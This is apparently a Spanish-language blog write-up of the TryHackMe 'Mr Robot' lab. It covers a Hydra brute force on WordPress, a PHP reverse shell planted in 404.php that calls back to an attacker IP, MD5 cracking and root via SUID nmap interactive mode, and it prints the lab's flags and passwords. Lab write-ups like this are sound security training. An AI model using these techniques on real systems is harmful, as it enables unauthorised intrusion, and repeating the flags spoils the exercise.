---
title: "Mr Robot CTF Walkthrough & Writeup — TryHackMe"
published: true
description: "Paso a paso completo de la máquina Mr Robot de TryHackMe: robots.txt, explotación de WordPress, crackeo de hashes MD5 y escalada de privilegios con SUID Nmap."
tags: cybersecurity, ctf, tryhackme, pentesting
cover_image: https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/01_nmap_scan.png
---

<!-- 
NOTA PARA DEV.TO:
Reemplaza 'araizcorp/tryhackme-writeups' con tu usuario y nombre del repositorio en GitHub.
Una vez subas la carpeta 'tryhackme/mr-robot' a GitHub, todas las imágenes se visualizarán automáticamente aquí.
-->

Guía detallada paso a paso para resolver la máquina **Mr Robot** en **TryHackMe**, basada en la icónica serie de televisión. En este reto encontramos 3 llaves (flags) a través de enumeración web, fuerza bruta sobre WordPress, descifrado de hashes y abuso de binarios SUID desactualizados.

---

## 🎯 Resumen del Ataque

```
[ Reconocimiento ]
       │
       ▼
[ /robots.txt ] ────► Descarga de fsocity.dic & Lectura de Flag 1 (key-1-of-3.txt)
       │
       ▼
[ WordPress /wp-login.php ]
       │─── Enumeración de usuario: Elliot
       │─── Limpieza de diccionario: sort -u fsocity.dic
       └─── Fuerza bruta Hydra: ER28-0652
       │
       ▼
[ Panel de Administración WP ] ──► Edición de 404.php (Reverse Shell PHP)
       │
       ▼
[ Shell daemon ]
       │─── /home/robot/password.raw-md5
       └─── CrackStation: abcdefghijklmnopqrstuvwxyz
       │
       ▼
[ Usuario robot ] ────► Lectura de Flag 2 (key-2-of-3.txt)
       │
       ▼
[ SUID /usr/local/bin/nmap ] ──► nmap --interactive -> !sh
       │
       ▼
[ Shell root ] ────► Lectura de Flag 3 (key-3-of-3.txt)
```

---

## 🔍 Fase 1: Reconocimiento Inicial

### Escaneo de Puertos (Nmap)

Comenzamos realizando un escaneo exhaustivo sobre la dirección IP de la máquina objetivo:

```bash
sudo nmap -sV -A 10.10.31.155
```

![Escaneo Inicial de Nmap](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/01_nmap_scan.png)

**Puertos descubiertos:**
* **80/tcp (HTTP):** Servidor Apache 2.4.7 corriendo una web interactiva de Mr. Robot.
* **443/tcp (HTTPS):** Apache con certificado SSL autofirmado.
* **22/tcp (SSH):** Puerto cerrado.

![Pantalla de Arranque del Objetivo](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/02_boot_target.png)

---

### Fuzzing Web (Gobuster / Feroxbuster)

Lanzamos una enumeración de rutas y directorios utilizando `gobuster`:

```bash
gobuster dir -u http://10.10.31.155 -w /usr/share/wordlists/dirb/common.txt
```

![Enumeración de Directorios con Gobuster](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/03_gobuster_scan.png)

**Rutas encontradas:**
* `/robots.txt`
* `/wp-login.php`
* `/wp-admin`
* `/0`
* `/feed`

---

## 🚩 Fase 2: Primera Flag (robots.txt)

Accedemos al archivo `robots.txt` en el navegador:

```
http://10.10.31.155/robots.txt
```

![Contenido de robots.txt](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/04_robots_txt.png)

El archivo contiene dos entradas clave:
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Descargamos directamente la primera clave:

```bash
curl -s http://10.10.31.155/key-1-of-3.txt
```

![Primera Flag](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/05_key_1_flag.png)

> **Key 1 of 3:** `073403c8a58a1f80d943455fb30724b9`

---

## 💥 Fase 3: Explotación Web & Acceso Inicial (Foothold)

### Análisis del Diccionario fsocity.dic

Descargamos el archivo `fsocity.dic` referenciado en el `robots.txt`:

```bash
curl -O http://10.10.31.155/fsocity.dic
```

![Descarga del Diccionario fsocity.dic](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/06_fsocity_wordlist.png)

El archivo tiene más de 800.000 líneas, pero muchas están duplicadas. Lo depuramos y ordenamos para optimizar la fuerza bruta:

```bash
wc -l fsocity.dic
# 858160 fsocity.dic

sort -u fsocity.dic > wordlist_clean.txt
wc -l wordlist_clean.txt
# 11451 wordlist_clean.txt
```

### Fuerza Bruta en WordPress con Hydra

Al probar nombres de usuario en `/wp-login.php`, WordPress informa si el usuario existe:
* Con un usuario inválido: *"Invalid username."*
* Con el usuario **Elliot**: *"The password you entered for the username Elliot is incorrect."*

Sabiendo que el usuario `Elliot` existe, lanzamos un ataque de fuerza bruta con `hydra`:

```bash
hydra -l Elliot -P wordlist_clean.txt 10.10.31.155 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username Elliot is incorrect." -t 48
```

Hydra encuentra la contraseña válida:
* **Usuario:** `Elliot`
* **Contraseña:** `ER28-0652`

---

### RCE mediante Edición de Plantilla (404.php)

Iniciamos sesión en el panel de WordPress (`http://10.10.31.155/wp-admin/`).
Nos dirigimos a **Appearance > Editor** y seleccionamos la plantilla `404.php` (Theme Twenty Fifteen).

Reemplazamos su código con la clásica reverse shell PHP de PentestMonkey, configurando nuestra IP de atacante (`10.10.16.19`) y puerto (`4444`):

![Edición de la plantilla 404.php](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/07_wp_theme_editor.png)

Ponemos nuestro netcat en escucha:

```bash
nc -lvnp 4444
```

Y ejecutamos la reverse shell cargando la página no encontrada:

```bash
curl http://10.10.31.155/wp-content/themes/twentyfifteen/404.php
```

Recibimos la conexión como usuario `daemon`:

![Conexión de Reverse Shell](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/08_daemon_shell.png)

---

## 🔑 Fase 4: Movimiento Lateral a Usuario robot (Segunda Flag)

### Estabilización de la TTY

Para tener una terminal completamente funcional:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
```

### Crackeo de Hash MD5

Navegamos al directorio `/home/robot`:

```bash
cd /home/robot
ls -la
```

Observamos dos archivos:
* `key-2-of-3.txt` (Permisos sólo para el usuario `robot`).
* `password.raw-md5` (Legible por todos).

Leemos el hash:

```bash
cat password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

Introducimos el hash `c3fcd3d76192e4007dfb496cca67e13b` en [CrackStation](https://crackstation.net/):

![Crackeo en CrackStation](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/09_crackstation_md5.png)

* **Resultado:** `abcdefghijklmnopqrstuvwxyz`

Cambiamos de usuario a `robot` con la contraseña descifrada:

```bash
su robot
# Password: abcdefghijklmnopqrstuvwxyz
whoami
# robot
cat /home/robot/key-2-of-3.txt
```

> **Key 2 of 3:** `822c73956184f694993bede3eb39f959`

---

## ⚡ Fase 5: Escalada de Privilegios a root (Tercera Flag)

### Enumeración de Binarios SUID

Buscamos binarios con el bit SUID activo en el sistema:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![Búsqueda de Binarios SUID](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/10_suid_enum.png)

Entre los resultados destaca `/usr/local/bin/nmap`:

![Nmap SUID Detectado](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/11_nmap_suid_found.png)

```bash
ls -la /usr/local/bin/nmap
# -rwsr-xr-x 1 root root ... /usr/local/bin/nmap
```

---

### Explotación de Nmap Interactive Mode

Las versiones antiguas de Nmap (2.02 a 5.21) incluían un modo interactivo (`--interactive`) que permitía ejecutar comandos del sistema con el prefijo `!sh`. Al tener SUID root, la shell invocada conserva los privilegios de superusuario:

```bash
/usr/local/bin/nmap --interactive
```

Dentro del prompt interactivo de nmap:

```bash
nmap> !sh
whoami
# root
```

![Root Shell y Flag 3](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/12_root_shell_flag3.png)

Leemos la última flag en `/root`:

```bash
cat /root/key-3-of-3.txt
```

> **Key 3 of 3:** `04787ddef27c3dee1ee161b21670b4e4`

---

## 🚩 Resumen de Flags

| Flag | Ubicación | Hash |
| :--- | :--- | :--- |
| **Key 1 of 3** | `/key-1-of-3.txt` (Web) | `073403c8a58a1f80d943455fb30724b9` |
| **Key 2 of 3** | `/home/robot/key-2-of-3.txt` | `822c73956184f694993bede3eb39f959` |
| **Key 3 of 3** | `/root/key-3-of-3.txt` | `04787ddef27c3dee1ee161b21670b4e4` |
